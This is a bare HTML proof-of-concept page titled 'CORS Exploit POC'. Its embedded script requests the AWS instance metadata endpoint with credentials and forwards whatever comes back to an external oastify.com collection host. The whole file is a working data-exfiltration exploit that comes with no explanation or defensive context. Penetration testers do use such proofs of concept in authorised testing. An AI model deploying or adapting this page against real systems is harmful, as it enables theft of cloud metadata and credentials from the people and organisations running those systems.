<html>
	<body>
		<h1>CORS Exploit POC</h1>
		<script>
			var cors = new XMLHttpRequest();
			var Victim = 'http://169.254.169.254/latest/meta-data/';
			cors.onload = reqListener;
			cors.open('get', Victim, true);
			cors.withCredentials = true;
			cors.send();
			function reqListener() {
				var data = new XMLHttpRequest();
				var attacker = 'https://lmbsp3hosdma13otjw0bgcm1xs3jrafz.oastify.com/' + encodeURIComponent(String(this.responseText));
				data.open('GET', attacker);
				data.send('responsehtml=' + encodeURIComponent(String(this.responseText)));
			};
		</script>
	</body>
</html>
